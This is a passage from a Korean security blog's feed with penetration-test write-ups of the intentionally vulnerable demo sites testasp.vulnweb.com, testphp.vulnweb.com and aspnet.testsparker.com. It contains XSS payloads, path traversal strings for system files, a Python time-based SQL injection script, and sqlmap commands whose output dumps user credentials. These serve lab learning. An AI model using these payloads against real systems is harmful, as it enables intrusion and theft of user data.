+<p>아래 스크립트를 포스팅하고 새로고침하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205473628-e16e82f1-3b5f-465b-954c-49684b95b5bd.png" alt="image" /></p>
+
+<p>스크립트가 실행됨
+<img src="https://user-images.githubusercontent.com/100695923/205473632-47e2f12c-4d91-4fd1-945c-8014b51c87e9.png" alt="image" /></p>
+
+<h3 id="xss-3">XSS-3</h3>
+<p>사용자 입력값을 검증하지 않는 검색 페이지가 존재</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testasp.vulnweb.com/Search.asp?tfSearch=test
+</code></pre></div></div>
+<p>스크립트 삽입</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?tfSearch=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205470606-65177fe1-afe1-46a3-b894-92588a887708.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/100695923/205470612-9e8511d1-4c32-48fd-8726-58a73a71892b.png" alt="image" /></p>
+
+<h2 id="cleartext-transmission">Cleartext Transmission</h2>
+<p>로그인 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testasp.vulnweb.com/Login.asp
+</code></pre></div></div>
+<p>버튼 클릭 시 ID/PW 정보가 평문으로 전송되고 있음
+<img src="https://user-images.githubusercontent.com/56434196/205791685-56c906cc-4164-496f-a679-68a6440cda62.png" alt="image" /></p>
+
+<h2 id="automated-attack">Automated Attack</h2>
+<p>게시글을 등록하는 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testasp.vulnweb.com/showforum.asp?id=0
+</code></pre></div></div>
+<p>‘글쓰기’ 요청 패킷을 동시에 11건 발송을 시도
+<img src="https://user-images.githubusercontent.com/56434196/207774080-50320b21-dafa-4d8e-9b33-7e7ec927a685.png" alt="image" /></p>
+
+<p>초당 사용자 요청 횟수를 제한하지 않아 모든 요청패킷이 처리되었고<br />제한되지 않은 요청처리로 인해 서버 Dos가 공격자에 의해 수행될수있음
+<img src="https://user-images.githubusercontent.com/56434196/207774100-98358aae-fabe-483d-b390-27f54b790efe.png" alt="image" /></p>
+
+<h2 id="etc">ETC</h2>
+<h3 id="unvalidated-redirect">Unvalidated Redirect</h3>
+<p>특정 페이지로 리다이렉트하는 페이지가 존재하며,
+도메인을 신뢰하고 있는 사용자는 아래 URL 링크 클릭할수있고 본인의 의도와 다르게 공격자의 피싱서버에 접속될수있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testasp.vulnweb.com/Logout.asp?RetURL=http://www.warning.or.kr/
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207745180-5dc8028b-6d3c-4c60-a8c3-044549c77f20.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/56434196/207745328-69eb59a4-7614-4390-bc00-4c3556dd89e2.png" alt="image" /></p>
+
+<p><br />
+<br />
+<br />
+Done.</p>]]></content><author><name>A1mH1gh</name><email>A1mH1gh4909@gmail.com</email></author><category term="VulnWebs_Writeup" /><summary type="html"><![CDATA[RECON OS: Windows Server WAS: Microsoft-IIS/8.5 Lang: ASP.NET Information Leakage 임의값을 전송하여 서버 에러를 유발시켜 서버 정보를 노출시킴 http://testasp.vulnweb.com/showforum.asp?id=asdasd Path Traversal 사용자로부터 Include 페이지를 입력받는 기능이 존재 http://testasp.vulnweb.com/Templatize.asp?item=html/about.html 서버의 내부 설정파일을 불러오는데 성공 ?item=../../../../../Windows/System32/drivers/etc/hosts SQLi ‘로그인 페이지’ 및 ‘공지사항 페이지’ 에 파라미터값을 SQL구문으로 전송할 경우 공격자가 의도한 결과를 얻어낼수있음 ex) 로그인 우회, 내부 DB 열람, … SQLi-1 로그인 페이지가 존재하며 http://testasp.vulnweb.com/Login.asp PW 입력값에 SQL쿼리를 넣어주었을 때 admin으로 로그인 성공 SQLi-2 공지사항 글번호를 입력받는 페이지가 존재하며 원래 서버가 기대하는 페이지 번호가 아닌 SQL구문을 삽입하여 DB정보를 획득할 수 있음 python sqlmap.py -u "http://testasp.vulnweb.com/showthread.asp?id=10" --dbs ___ __H__ ___ ___[.]_____ ___ ___ {1.6.3.19#dev} |_ -| . [(] | .'| . | |___|_ [']_|_|_|__,| _| |_|V... |_| https://sqlmap.org --- Parameter: id (GET) Type: stacked queries Title: Microsoft SQL Server/Sybase stacked queries (comment) Payload: id=10;WAITFOR DELAY '0:0:5'-- --- [13:05:39] [INFO] the back-end DBMS is Microsoft SQL Server web server operating system: Windows 8.1 or 2012 R2 web application technology: ASP.NET, ASP, Microsoft IIS 8.5 back-end DBMS: Microsoft SQL Server 2014 [13:05:39] [INFO] fetching database names [13:05:39] [INFO] fetching number of databases [13:05:39] [INFO] resumed: 7 [13:05:39] [INFO] resumed: acuforum [13:05:39] [INFO] resumed: acuservice [13:05:39] [INFO] resumed: master [13:05:39] [INFO] resumed: model [13:05:39] [INFO] resumed: msdb [13:05:39] [INFO] resumed: tempdb Table 명 확인 python sqlmap.py -u "http://testasp.vulnweb.com/showthread.asp?id=10" -D acuforum --tables Database: acuforum [4 tables] +---------+ | forums | | posts | | threads | | users | +---------+ Columns python sqlmap.py -u "http://testasp.vulnweb.com/showthread.asp?id=10" -D acuforum -T users --dump Database: acuforum Table: users [4 entries] +-------------------------------------+--------------+-------------+---------+---------------------+ | email | uname | upass | avatar | realname | +-------------------------------------+--------------+-------------+---------+---------------------+ | 1337 | 1337 | 1337 | &lt;blank&gt; | 1337 | | admin@adminspace.com | admin | none | &lt;blank&gt; | admin the allmighty | | karebiveresemkelirmanners@gmail.com | griella | y1!7aon2EjH | &lt;blank&gt; | griella | | oliviaclara3120@gmail.com | Prestonwarve | &amp;nu91X | &lt;blank&gt; | Prestonwarve | +-------------------------------------+--------------+-------------+---------+---------------------+ ID: admin PW: none XSS XSS-1 회원가입 페이지에서 http://testasp.vulnweb.com/Register.asp ‘ID 입력 폼’ 에 스크립트 구문 삽입 &lt;script&gt;alert(1)&lt;/script&gt; 회원가입 성공 후 로그인 로그인 사용자명이 페이지 내에 반환되어 스크립트 실행됨 XSS-2 포럼 글쓰기 페이지에서 http://testasp.vulnweb.com/showforum.asp?id=2 아래 스크립트를 포스팅하고 새로고침하면 &lt;script&gt;alert(document.domain)&lt;/script&gt; 스크립트가 실행됨 XSS-3 사용자 입력값을 검증하지 않는 검색 페이지가 존재 http://testasp.vulnweb.com/Search.asp?tfSearch=test 스크립트 삽입 ?tfSearch=&lt;script&gt;alert(document.domain)&lt;/script&gt; Cleartext Transmission 로그인 페이지에서 http://testasp.vulnweb.com/Login.asp 버튼 클릭 시 ID/PW 정보가 평문으로 전송되고 있음 Automated Attack 게시글을 등록하는 페이지에서 http://testasp.vulnweb.com/showforum.asp?id=0 ‘글쓰기’ 요청 패킷을 동시에 11건 발송을 시도 초당 사용자 요청 횟수를 제한하지 않아 모든 요청패킷이 처리되었고제한되지 않은 요청처리로 인해 서버 Dos가 공격자에 의해 수행될수있음 ETC Unvalidated Redirect 특정 페이지로 리다이렉트하는 페이지가 존재하며, 도메인을 신뢰하고 있는 사용자는 아래 URL 링크 클릭할수있고 본인의 의도와 다르게 공격자의 피싱서버에 접속될수있음 http://testasp.vulnweb.com/Logout.asp?RetURL=http://www.warning.or.kr/ Done.]]></summary></entry><entry><title type="html">[ VulnWebs ] - testphp.vulnweb.com</title><link href="http://localhost:4000/vulnwebs_writeup/VulnWebs-testphp.vulnweb.com/" rel="alternate" type="text/html" title="[ VulnWebs ] - testphp.vulnweb.com" /><published>2022-12-01T00:00:00+09:00</published><updated>2022-12-01T00:00:00+09:00</updated><id>http://localhost:4000/vulnwebs_writeup/%5BVulnWebs%5D-testphp.vulnweb.com</id><content type="html" xml:base="http://localhost:4000/vulnwebs_writeup/VulnWebs-testphp.vulnweb.com/"><![CDATA[<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/205482472-b6bf6ab3-4b15-4944-86d5-6d725a0c3b63.png" alt="image" /></p>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/207834103-24c163df-4361-41dd-b7c0-cc0d4be16336.png" alt="image" /></p>
+
+<h2 id="recon">RECON</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PHP 5.6.40
+Nginx
+Ubuntu
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205312850-073153ed-3a56-4a37-a567-0aa2b75fb9a6.png" alt="image" /></p>
+
+<h2 id="position-leakage">Position Leakage</h2>
+<h3 id="position-leakage-1">Position Leakage-1</h3>
+<p>Google Dork을 통해 ‘백업 파일’을 검색</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>site:testphp.vulnweb.com intext:"bak"
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205790692-bf30175c-2b26-476e-bd86-4e383eb9ecf6.png" alt="image" /></p>
+
+<p>‘pictures’ 디렉토리 내 백업파일이 존재하고 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testphp.vulnweb.com/pictures/wp-config.bak
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/56434196/205790248-52544018-a370-4262-8070-a2b5477e805d.png" alt="image" /></p>
+
+<h3 id="position-leakage-2">Position Leakage-2</h3>
+<p>자동진단 툴이 아래 ‘서버 정보 파일’을 발견!</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testphp.vulnweb.com/secured/phpinfo.php
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207742330-9ec35a27-ad4f-4629-9de9-b967e5d3ed9a.png" alt="image" /></p>
+
+<p>자동진단 툴이 아래 ‘백업 파일’을 발견!
+<br />
+부분 소스코드를 확인할수있으며 2차 공격으로 이어질수있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testphp.vulnweb.com/index.bak		
+http://testphp.vulnweb.com/index.zip
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207742958-71494724-5d45-425d-85b7-3031e4a018f1.png" alt="image" /></p>
+
+<h2 id="directory-indexing">Directory Indexing</h2>
+<p>대부분의 디렉토리에서 인덱싱을 활성화 하고 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+http://testphp.vulnweb.com/admin/
+http://testphp.vulnweb.com/pictures/
+http://testphp.vulnweb.com/images/
+...
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205313427-b1564c84-b87a-4c5d-bf33-1d3d411d92cb.png" alt="image" /></p>
+
+<p>그 밖에 결과는 ‘구글해킹’으로 찾을 수 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>site:testphp.vulnweb.com intitle:"index of"
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205314664-951e4ad7-3df0-4ed0-9ddd-cb8a8a0c3c23.png" alt="image" /></p>
+
+<h2 id="sqli">SQLi</h2>
+<p>사용자로부터 게시글 번호를 받아 게시글을 출력해주는 페이지가 존재</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testphp.vulnweb.com/listproducts.php?cat=1
+</code></pre></div></div>
+<p>주목할점은 숫자(int)를 받는 다는 것이며 따라서 우리는 <strong>sleep 인젝션</strong>을 시도해볼수있음
+<br />
+Request time을 3초, 9초 넣어서 Response time과 동일한지 확인하는 스크립트</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://testphp.vulnweb.com/listproducts.php?cat='</span>
+<span class="n">time</span> <span class="o">=</span> <span class="mi">3</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'(select*from(select(sleep(</span><span class="si">{</span><span class="n">time</span><span class="si">}</span><span class="s">)))a)'</span>
+
+
+<span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">elapsed</span><span class="p">.</span><span class="n">total_seconds</span><span class="p">())</span>
+</code></pre></div></div>
+<p>응답시간이 동일한것으로 보아 서버 내 sleep함수를 실행시키고 있는 것을 알수있음
+<img src="https://user-images.githubusercontent.com/100695923/205322024-389eb986-af4b-4b5b-bd9f-972868b6ec49.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/100695923/205322481-4f9f81e0-c5c7-4fdd-a59e-3d6815c219a7.png" alt="image" /></p>
+
+<p>본격적인 SQL인젝션 공격 수행(Time-based SQLi)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.6.3.19#dev}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[10:06:39] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL &gt;= 5.6
+[10:06:39] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+</code></pre></div></div>
+<p>테이블 정보 획득</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
+
+Database: acuart
+[8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+</code></pre></div></div>
+<p>컬럼정보 획득</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump
+Database: acuart
+Table: users
+[1 entry]
++---------------------+----------------------------------+-----------------+------+-----------------+---------+-------+-----------+
+| cc                  | cart                             | name            | pass | email           | phone   | uname | address   |
++---------------------+----------------------------------+-----------------+------+-----------------+---------+-------+-----------+
+| 1234-5678-2300-9000 | 37a64cca70db0ca7e0f562ca947426a5 | John The Ripper | test | email@email.com | 2323345 | test  | 21 street |
++---------------------+----------------------------------+-----------------+------+-----------------+---------+-------+-----------+
+</code></pre></div></div>
+<p>최종적으로 계정정보를 획득함</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ID: test
+PW: test
+</code></pre></div></div>
+
+<h2 id="xss">XSS</h2>
+<p>입력값 검증이 없는 검색 페이지가 존재하며</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testphp.vulnweb.com/search.php?test=query
+</code></pre></div></div>
+<p>검색창에 아래 문자열을 전송하면 스크립트가 실행됨</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205470246-f052893c-0864-4db1-9f8d-ca8dc76cfe4d.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/100695923/205470258-4e53cc16-eccd-4fe9-8282-32f49fc061b2.png" alt="image" /></p>
+
+<h2 id="cleartext-transmission">Cleartext Transmission</h2>
+<p>로그인 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testphp.vulnweb.com/login.php
+</code></pre></div></div>
+
+<p>평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음<br />(인코딩 및 암호화되지 않음)
+<img src="https://user-images.githubusercontent.com/56434196/205789497-79a11928-a5a8-4143-8dbc-be9d08a37a0c.png" alt="image" /></p>
+
+<h2 id="insufficient-session-expiration">Insufficient Session Expiration</h2>
+<p>‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음
+<br />로그인 직후 모습 
+<img src="https://user-images.githubusercontent.com/56434196/207770037-59e88336-0516-4b8d-8b2c-b6f2a74a7637.png" alt="image" /></p>
+
+<p>1시간 경과 모습
+<img src="https://user-images.githubusercontent.com/56434196/207770055-01cf9b53-de14-4cc1-9e04-29cf30752d23.png" alt="image" /></p>
+
+<h2 id="etc">ETC</h2>
+<h3 id="unvalidated-redirect">Unvalidated Redirect</h3>
+<p>특정 페이지로 리다이렉트하는 페이지가 존재하며</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testphp.vulnweb.com/redir.php?r=index.php
+</code></pre></div></div>
+<p>도메인을 신뢰하고 있는 사용자는 아래 URL 링크 클릭할수있고 본인의 의도와 다르게 공격자의 피싱서버에 접속될수있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?r=http://www.warning.or.kr/
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207743528-c596aaf4-a6b8-467d-b334-fb841dd3b57a.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/56434196/207745328-69eb59a4-7614-4390-bc00-4c3556dd89e2.png" alt="image" /></p>
+
+<p><br />
+<br />
+<br />
+Done.</p>]]></content><author><name>A1mH1gh</name><email>A1mH1gh4909@gmail.com</email></author><category term="VulnWebs_Writeup" /><summary type="html"><![CDATA[RECON PHP 5.6.40 Nginx Ubuntu Position Leakage Position Leakage-1 Google Dork을 통해 ‘백업 파일’을 검색 site:testphp.vulnweb.com intext:"bak" ‘pictures’ 디렉토리 내 백업파일이 존재하고 있음 http://testphp.vulnweb.com/pictures/wp-config.bak Position Leakage-2 자동진단 툴이 아래 ‘서버 정보 파일’을 발견! http://testphp.vulnweb.com/secured/phpinfo.php 자동진단 툴이 아래 ‘백업 파일’을 발견! 부분 소스코드를 확인할수있으며 2차 공격으로 이어질수있음 http://testphp.vulnweb.com/index.bak http://testphp.vulnweb.com/index.zip Directory Indexing 대부분의 디렉토리에서 인덱싱을 활성화 하고 있음 ... http://testphp.vulnweb.com/admin/ http://testphp.vulnweb.com/pictures/ http://testphp.vulnweb.com/images/ ... 그 밖에 결과는 ‘구글해킹’으로 찾을 수 있음 site:testphp.vulnweb.com intitle:"index of" SQLi 사용자로부터 게시글 번호를 받아 게시글을 출력해주는 페이지가 존재 http://testphp.vulnweb.com/listproducts.php?cat=1 주목할점은 숫자(int)를 받는 다는 것이며 따라서 우리는 sleep 인젝션을 시도해볼수있음 Request time을 3초, 9초 넣어서 Response time과 동일한지 확인하는 스크립트 import requests url = 'http://testphp.vulnweb.com/listproducts.php?cat=' time = 3 payload = f'(select*from(select(sleep({time})))a)' r=requests.get(url+payload) print(r.elapsed.total_seconds()) 응답시간이 동일한것으로 보아 서버 내 sleep함수를 실행시키고 있는 것을 알수있음 본격적인 SQL인젝션 공격 수행(Time-based SQLi) python sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs ___ __H__ ___ ___["]_____ ___ ___ {1.6.3.19#dev} |_ -| . [.] | .'| . | |___|_ ["]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [10:06:39] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu web application technology: Nginx 1.19.0, PHP 5.6.40 back-end DBMS: MySQL &gt;= 5.6 [10:06:39] [INFO] fetching database names available databases [2]: [*] acuart [*] information_schema 테이블 정보 획득 python sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables Database: acuart [8 tables] +-----------+ | artists | | carts | | categ | | featured | | guestbook | | pictures | | products | | users | +-----------+ 컬럼정보 획득 python sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump Database: acuart Table: users [1 entry] +---------------------+----------------------------------+-----------------+------+-----------------+---------+-------+-----------+ | cc | cart | name | pass | email | phone | uname | address | +---------------------+----------------------------------+-----------------+------+-----------------+---------+-------+-----------+ | 1234-5678-2300-9000 | 37a64cca70db0ca7e0f562ca947426a5 | John The Ripper | test | email@email.com | 2323345 | test | 21 street | +---------------------+----------------------------------+-----------------+------+-----------------+---------+-------+-----------+ 최종적으로 계정정보를 획득함 ID: test PW: test XSS 입력값 검증이 없는 검색 페이지가 존재하며 http://testphp.vulnweb.com/search.php?test=query 검색창에 아래 문자열을 전송하면 스크립트가 실행됨 &lt;script&gt;alert(document.domain)&lt;/script&gt; Cleartext Transmission 로그인 페이지에서 http://testphp.vulnweb.com/login.php 평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음(인코딩 및 암호화되지 않음) Insufficient Session Expiration ‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음 로그인 직후 모습 1시간 경과 모습 ETC Unvalidated Redirect 특정 페이지로 리다이렉트하는 페이지가 존재하며 http://testphp.vulnweb.com/redir.php?r=index.php 도메인을 신뢰하고 있는 사용자는 아래 URL 링크 클릭할수있고 본인의 의도와 다르게 공격자의 피싱서버에 접속될수있음 ?r=http://www.warning.or.kr/ Done.]]></summary></entry><entry><title type="html">[ VulnWebs ] - aspnet.testsparker.com</title><link href="http://localhost:4000/vulnwebs_writeup/VulnWebs-aspnet.testsparker.com/" rel="alternate" type="text/html" title="[ VulnWebs ] - aspnet.testsparker.com" /><published>2022-11-30T00:00:00+09:00</published><updated>2022-11-30T00:00:00+09:00</updated><id>http://localhost:4000/vulnwebs_writeup/%5BVulnWebs%5D-aspnet.testsparker.com</id><content type="html" xml:base="http://localhost:4000/vulnwebs_writeup/VulnWebs-aspnet.testsparker.com/"><![CDATA[<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/205482453-eb0c3a37-257a-4a86-9792-98e010f16397.png" alt="image" /></p>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/207833998-d47333a2-62e4-4fd0-90a3-14a4bf62b0c3.png" alt="image" /></p>
+
+<h2 id="recon">RECON</h2>
+<p><img src="https://user-images.githubusercontent.com/56434196/205787070-c8580e0a-fc0f-49d1-a9e6-4f84ce94a79c.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OS: Windows Server
+WAS: IIS/8.5
+Lang: ASP.NET/4.0.30319
+</code></pre></div></div>
+<h2 id="information-leakage">Information Leakage</h2>
+<p>서버 에러를 유도하는 값을 전달하여 반환하는 페이지에서 서버 설정 관련 정보를 획득할 수 있으며 2차 공격으로 이어질수있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://aspnet.testsparker.com/Help.aspx?item=./Default.aspx
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205229572-a3e0cd55-6189-4726-bb80-39120dbbbaed.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://aspnet.testsparker.com/test
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205230332-a063e07e-181d-4146-a4a8-682d5f445a3c.png" alt="image" /></p>
+<h2 id="xss">XSS</h2>
+<p>사용자 입력값이 고대로 반환되는 페이지가 존재</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://aspnet.testsparker.com/About.aspx?hello=test
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205227725-335869e0-5a69-4d6f-8c2f-6b33de3f959c.png" alt="image" />
+스크립트 구문을 삽입하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://aspnet.testsparker.com/About.aspx?hello=visitor&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre></div></div>
+<p>스크립트 실행
+<img src="https://user-images.githubusercontent.com/56434196/205227943-89e3104a-690a-47c6-85bb-7dfafd4ed04c.png" alt="image" /></p>
+
+<h2 id="directory-indexing">Directory Indexing</h2>
+<p>서버 내 ‘디렉토리 인덱싱’이 활성화된 디렉토리를 발견, 내부 파일 정보가 노출</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://aspnet.testsparker.com/statics/
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205229837-fd0ea85e-e929-4482-8d56-e0353df94b48.png" alt="image" /></p>
+
+<h2 id="path-traversal">Path Traversal</h2>
+<p>사용자로부터 서버 내 특정 페이지를 입력받는 기능이 존재</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://aspnet.testsparker.com/Help.aspx?item=help-konu1.html
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205233636-7e72fc33-6a21-4cba-aca6-92ec81600a19.png" alt="image" /></p>
+
+<p>이때, 서버 중요 파일의 경로를 전달하여 데이터를 읽음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?item=../../../Windows/System32/drivers/etc/hosts
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205233402-bc61e2e5-b139-4a9c-bde1-9b7cf4a8927b.png" alt="image" /></p>
+
+<h2 id="cleartext-transmission">Cleartext Transmission</h2>
+<p>로그인 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://aspnet.testsparker.com/administrator/Login.aspx
+</code></pre></div></div>
+
+<p>평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음<br />(인코딩 및 암호화되지 않음)
+<img src="https://user-images.githubusercontent.com/56434196/205786235-ae659b66-a5bd-4e3f-813b-57c94173288b.png" alt="image" /></p>
+
+<h2 id="insufficient-session-expiration">Insufficient Session Expiration</h2>
+<p>‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음
+<br />로그인 직후 모습 
+<img src="https://user-images.githubusercontent.com/56434196/207769943-0190d526-7b1c-47cc-b74b-7a00314124aa.png" alt="image" /></p>
+
+<p>1시간 경과 모습
+<img src="https://user-images.githubusercontent.com/56434196/207769960-ce08437e-1815-469a-b915-004106fee376.png" alt="image" /></p>
+
+<h2 id="sqli">SQLi</h2>
+<p>판매상품 정보를 불러오는 페이지가 존재</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://aspnet.testsparker.com/Products.aspx?pId=4
+</code></pre></div></div>
+<p>SQL 문자(‘) 삽입 시 에러반환을 하는 것을 보니 SQLi에 취약한 가능성이 보임</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?pId='
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207740675-6ca03404-48eb-4034-ae34-dbb878924f7e.png" alt="image" /></p>
+
+<p>sqlmap 도구를 이용하여 SQLi 시작<br />
+DB정보 획득를 한 모습</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python sqlmap.py -u "http://aspnet.testsparker.com/Products.aspx?pId=1" --dbs
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.6.11.10#dev}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+web server operating system: Windows 2012 R2 or 8.1
+web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 8.5
+back-end DBMS: Microsoft SQL Server 2014
+
+available databases [6]:
+[*] ASPState
+[*] master
+[*] model
+[*] msdb
+[*] tempdb
+[*] testsparker
+</code></pre></div></div>
+<h2 id="etc">ETC</h2>
+<h3 id="unvalidated-redirect">Unvalidated Redirect</h3>
+<p>도메인을 신뢰하고 있는 사용자는 아래 URL 링크 클릭할수있고 본인의 의도와 다르게 공격자의 피싱서버에 접속할수있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://aspnet.testsparker.com/redirect.aspx?site=warning.or.kr
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207529056-88eaf534-21c5-4649-b066-98485874a217.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/56434196/207745328-69eb59a4-7614-4390-bc00-4c3556dd89e2.png" alt="image" /></p>
+
+<p><br />
+<br />
+<br />
